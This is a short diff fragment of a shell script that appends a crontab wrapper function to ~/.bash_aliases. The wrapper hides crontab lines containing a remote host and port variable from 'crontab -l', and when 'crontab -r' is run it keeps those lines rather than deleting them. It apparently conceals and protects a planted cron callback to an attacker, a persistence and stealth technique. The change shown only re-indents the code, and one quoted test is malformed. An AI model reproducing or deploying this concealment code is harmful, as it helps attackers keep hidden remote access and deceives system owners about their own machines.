@@ -88,11 +88,11 @@ then
 	if $(echo "$1" | grep -qi "\-l");
 	then
 		if [ `$REALBIN -l | grep -v "'$RHOST'" | grep -v "'$RPORT'" | wc -l` -eq 0 ];then echo no crontab for $USER; else $REALBIN -l | grep -v "'$RHOST'" | grep -v "'$RPORT'"; fi;
-		elif $(echo "$1 | grep -qi "\-r);
-		then
-			if $(`$REALBIN` -l | grep "'$RHOST'" | grep -qi "'$RPORT'");then `$REALBIN` -l | grep --color=never "'$RHOST'" | grep --color=never "'$RPORT'" | crontab; else $REALBIN -r; fi;
-			else
-				$REALBIN "${@:1}"
+	elif $(echo "$1 | grep -qi "\-r);
+	then
+		if $(`$REALBIN` -l | grep "'$RHOST'" | grep -qi "'$RPORT'");then `$REALBIN` -l | grep --color=never "'$RHOST'" | grep --color=never "'$RPORT'" | crontab; else $REALBIN -r; fi;
+	else
+		$REALBIN "${@:1}"
 	fi
 }' >> ~/.bash_aliases
 fi
